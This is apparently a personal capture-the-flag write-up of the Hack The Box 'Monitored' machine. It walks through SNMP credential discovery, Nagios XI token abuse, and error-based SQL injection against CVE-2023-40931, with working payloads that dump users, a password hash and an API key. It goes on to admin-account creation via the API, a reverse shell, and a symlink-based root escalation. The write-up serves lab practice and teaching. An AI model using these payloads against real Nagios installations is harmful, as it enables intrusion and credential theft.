---
title: 'HTB-Monitored'
published: 2025-09-18
draft: false
toc: true
---
**Start 14:14 19-04-2025**

---
```
Scope:
10.10.11.248
```
# Recon

## Nmap

### TCP

```bash
sudo nmap -sC -sV -p- monitored -sT -T5 --min-rate=5000 -Pn -vvvv

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http       syn-ack Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
389/tcp  open  ldap       syn-ack OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth
5667/tcp open  tcpwrapped syn-ack
Service Info: Hosts: nagios.monitored.htb, 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### UDP

I then went on to scan UDP ports as well.

```bash
sudo nmap -sC -sV -p161 monitored -sU -T5 --min-rate=5000 -Pn -vvvv

PORT    STATE SERVICE REASON              VERSION
161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
|_  System uptime: 5m33.13s (33313 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 6f3fa7421af94c6500000000
|   snmpEngineBoots: 36
|_  snmpEngineTime: 5m33s
```

Some interesting params popped up as well:

![](attachments/0435dd26f152c0cddad1d97b03831742.png)

![](attachments/3eb8e44d646a0df369e7f145e4bda93b.png)

There appears to be a set of creds written down here?

```creds
svc
XjH7VCehowpR1xZB
```

![](attachments/92af48b0e9a5a0532e3d849d262fcee4.png)


## 22/TCP - SSH

Tried to go for a quick win, alas:

![](attachments/33b3a6737763e1609b9fe8554d5cefb6.png)


## 443/TCP - HTTPS

![](attachments/45e8ced5da6a824515c508c01b4c8984.png)

![](attachments/30234ffad45b74103a19bc8095a4b815.png)

When clicking **Access** we get the following page:

![](attachments/d817d14bd87edbfb73171aac49b75d20.png)

I tried logging in with the presumed creds but that didn't work:

![](attachments/3ea0c5f1923290878748cd83888461c2.png)

However if we enter a different password we get a completely different error message:

![](attachments/0ed5215eda45807a8168f33d311b0262.png)

Interesting, this means that the creds are HIGHLY LIKELY correct and the account access has been restricted.

For now we can't do anything further, let's enumerate the endpoints.


## Feroxbuster

After a LONG while I finally got some luck:

![](attachments/581a969eb37a96e7c0891d5826be55af.png)

However when going to the page we get the following:

![](attachments/f9457e7b80082f6a90528106bfad3c98.png)

This might call for some `burpsuite` action.

## BurpSuite

![](attachments/49f1564e26e4bbbba065e794d10c17ad.png)

Let's change it to `POST`

![](attachments/91e157ef4d238e76a7916e013216cd86.png)

I then added the following 2 lines in order to create the `POST` request:

```
Content-Type: application/x-www-form-urlencoded

username=svc&password=XjH7VCehowpR1xZB
```

![](attachments/0f486c633bf3fd8e1aea296786760262.png)

>[!warning]
>The highlighted line is absolutely paramount for success, without it the request will fail!

This gives us the following response:

![](attachments/2c861d4819f9e8d28607d30f6ea073bf.png)

Having received the `auth_token` we can use this `curl` request to get access to the backend:

![](attachments/d38eafd5056c0fe201f9d845d34a3157.png)

![](attachments/d4d5a6994dbe1c4571fb693e6687aca5.png)

Strange, this might mean that either the `auth_token` =/= the `api-key`, or that it is indeed invalid.

I looked up the endpoint to look for more help:

![](attachments/f7945b412a9f83a1491f97f42334a765.png)

![](attachments/9e526e6fed3c56c569e54d1c6c775ecc.png)

```bash
curl -k -L 'https://nagios.monitored.htb/nagiosxi/includes/components/nagioscore/ui/trends.php?createimage&host=localhost&token=72695c532f2fff8b9ddcd6aaaffe2f27b6224650' > image.png
```

![](attachments/e361bd81d2392dc4df037ca1615a2bee.png)

![](attachments/69b9314acb1aa7ab8c31cc77ccbd0171.png)

It seemed to work! Looks like we found the correct param being `token`.

I then had to get a new token because the last one expired:

![](attachments/d1c126ba67df8662b0786d178f220d66.png)

I used the token to login:

![](attachments/2e3c14f43db550859737af526bd0537a.png)

This rerouted me to the following page:

![](attachments/bec5e085c2f5539ca358320cf4df7529.png)

Couple thins to note down are the version running:

```
Nagios Xi 5.11.0
```

![](attachments/c0ce4519281b545b177fcb90096d6e47.png)

There seems to be a SQLi vulnerability for this version, let's first check out what else we can find:

![](attachments/903da2078ba6462fafe79a6e95df666a.png)

We were able to find the API key.


## SQLi

Let's move on to the SQLi [POC](https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c)

![](attachments/0d9558a7354a563a0e8048ed01aef373.png)

Trying this out we see the following response:

![](attachments/f649a1e973b1463c10a5bf086b38529f.png)

>[!success]
>Error = good!

>[!note]
>Let's modify our SQLi, since the rest of the POC writeup goes on using SQLmap I will be diverting my course, since I cannot always use SQLmap in the wild (such as OSCP exam).

![](attachments/912afb0318cc79eedea13313cceb03af.png)

I then started checking for the version of SQL running:

```sql
id=1 AND EXTRACTVALUE(1,(SELECT VERSION()))
```

![](attachments/6e380baf6a9d3ea5c8f9ffa42ed59763.png)

This seemed to work and displayed the version, meaning our query worked!

![](attachments/2f034f61480bb79c1377cea9bcddc918.png)

>[!important]
>Going forward we need to make sure that our query throws an error message, or it will simply not be telling us the outcome of our query i.e.
>![](attachments/5d6bdc64731e1247db713a0f31917cbe.png)

![](attachments/200269472b39305021d19e9343935a8e.png)

We notice that there's a total of 2 databases, namely `information_schema` and `nagiosxi`.

Next step here would be to query the table and columns of the `nagiosxi` database. To get the full output we can use something like:

```sql
id=1 AND EXTRACTVALUE(1,concat(1, (select group_concat(TABLE_NAME, COLUMN_NAME) from information_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi')))
```

However the output only shows the first part since the output is limited:

![](attachments/81ef170e250b31e76b02c6b57ad65ab7.png)

We can change it up in order to get the individual tables first:

```sql
id=1 AND EXTRACTVALUE(1,concat(1, (select TABLE_NAME from information_SCHEMA.COLUMNS where TABLE_SCHEMA = 'nagiosxi' LIMIT 0,1)))
```

This would be an extraordinary tedious process, but when increasing the number in `LIMIT 0,1` it will go on to the next table in the database. To speed things up we can use `Intruder` inside `burpsuite`:


### Burpsuite - Intruder

We will send our initial request to `Intruder` and then do the following:

![](attachments/2de2c9685ddfd981973e8dea9922dd6c.png)

![](attachments/9b873fef76b6a33bfa77c8c16beb21bb.png)

>[!warning]
>This will still be an enormously tedious process to check, however as per [this ippsec video](https://www.youtube.com/watch?v=Ulb2rm2qbJY) I learned how to make it a more grep-able output.

![](attachments/a648bd7c5b8e2b549f62d4d3dae6ddff.png)

We will now click on **Add** and add the following expression and delimiter:

![](attachments/aeba8ba773bdd7061b905f1c895e71b4.png)

This will make sure that our output starts at the `|` symbol we used in the `concat` command, and it will end in the single quote SQL delimiter.

![](attachments/622a1662cf97d0b412c1efb9109123e1.png)

We found the table name that we're looking for, namely `xi_users`. Now let's modify our `Repeater` query and get the columns from this table.

![](attachments/f2f32b2f9cf69cf396254d8c6cd7a500.png)

Again when we change it to `1,1` we get the following column:

![](attachments/8174168b4b774cc061e94996364a3fcb.png)

When running this in `Intruder` we notice that `1,1` returns usernames and `2,1` returns passwords.

Furthermore `7,1` returns us the `api_key` variable that we so desperately need:

![](attachments/42e591968ac321d5b554bf9db6a2f66d.png)

We can now get the juicy stuff, this being the `username`, `password` and `api_key` variables.

```sql
id=1 AND EXTRACTVALUE(1,concat(0x7e,(SELECT username from xi_users LIMIT 0,1)))
```

![](attachments/b68a3ac6b846afbf1eff29226ecce8d5.png)

>[!note]
>Since it can't give us full outputs we'll have to improvise by using the `SUBSTRING` command.

```sql
id=1 AND EXTRACTVALUE(1,concat(0x7e,(SELECT substring(password,1,28) from xi_users LIMIT 0,1)))
```

```
nagiosadmin
$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C
IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
```

![](attachments/bb630d6616b391d50e3bb9c54474c2e0.png)

I'll try to crack it for good measure.

>[!fail]
>Spoiler alert, this wouldn't crack.


## New Account creation

![](attachments/440112eac57d2c16e239203d269b776b.png)

This time the curl command worked, confirming the correct API key.

After some more snooping online I found the following PoC:

![](attachments/29f59e14baf1c29e3597ec4a359c8166.png)

Here I found a POST request that creates a new admin user using the admin API key (the one we just found).

![](attachments/9a4591a69d15518cd425a6ede34ba0ba.png)

We follow the same `data` command:

![](attachments/f8b266a94dac6e1b42ea4c5037e6857d.png)

It shows the user has been succesfully created.

```
l33th4x0r
Password123
```


# Foothold
## Shell as Nagios

We can now log out and login again as our newly created user:

![](attachments/54978b96a0152adcbf46f1dc8ee23e85.png)

We notice the new **Admin** panel:

![](attachments/4208025e9cd4dabafd847ea37f375633.png)

However this isn't as interesting for us, instead let's peek at this:

![](attachments/af7d8627019b39743a50eaffdea6d771.png)

We can create and execute commands from the config manager, let's try and create a reverse shell.

![](attachments/9bfda65428cb64339a33d4b93e0d34a7.png)

Now we press **Save** and head on over to the **Core Config Manager** -> **Services** tab where we also add a new service.

![](attachments/3ca8a582b7cc713c709342d9ada409b8.png)

![](attachments/d0afba7d3775417c040b91830a82b4a7.png)

![](attachments/c1e735327469efc6c33b74e7dd6593ef.png)

Just like that we got a revshell.

## user.txt

![](attachments/b559df6e051ecb8bd45e45ca63385ede.png)

## User enum

Before doing any enum I went ahead and made my life easier by using my private key to SSH into the target:

![](attachments/f08f1b7ecd9fc7de41fde84856fb8433.png)

Now that I had a more stable shell I went on with enumeration.

![](attachments/df3c5945cd96b2a37ef4f7a3da6d40be.png)

From these files I noticed that `getprofile.sh` zipped log files:

![](attachments/844143d0c666be360d676a3697116f31.png)


# Privilege Escalation

We will now be inspecting the `getprofile.sh` script and check for symlinks.

>[!important]
>When zipping files, symlinks are one of the most important things to look for.

>[!note]
>For this I will also be following along with the ippsec video as I do not know enough about symlinks.

![](attachments/8c3e873499ffe36bbac93bd432bc149a.png)

We notice inside the script that it's grabbing the last 500 characters from the `cmdsubsys.log` file and zipping it into the `cmdsubsys.txt` file inside the zip. Let's create a sym link involving the presumed `id_rsa` file from *root*.

![](attachments/5cd295d7db52f8f4fe70abea9dd4d8a9.png)

![](attachments/66324e33e278cfa9b2d6e16d714d1360.png)

Let's see if it worked.

![](attachments/5b2fd1503c2c5d11dec5316befb106fa.png)

We then head on down the rabbit hole until we find the correct file.

![](attachments/f18c3b6abdb1463d89f12296df4f4ca6.png)

Perfect, let's copy it over and get our root shell.

![](attachments/b4dabd462754d59c3adaa3413c6a6c95.png)

Just like that we've got access as *root*.

## root.txt

![](attachments/c19dcc55cec194c3deae55cfe9d6438b.png)

![](attachments/4a80b4190501fd3203dcd3a30913662e.png)

---

**Finished 21:25 19-04-2025**

[^Links]: [[Hack The Box]] [[OSCP Prep]]

#SQLi #burpsuite #Repeater #Intruder #NagiosXI #Symlinks 
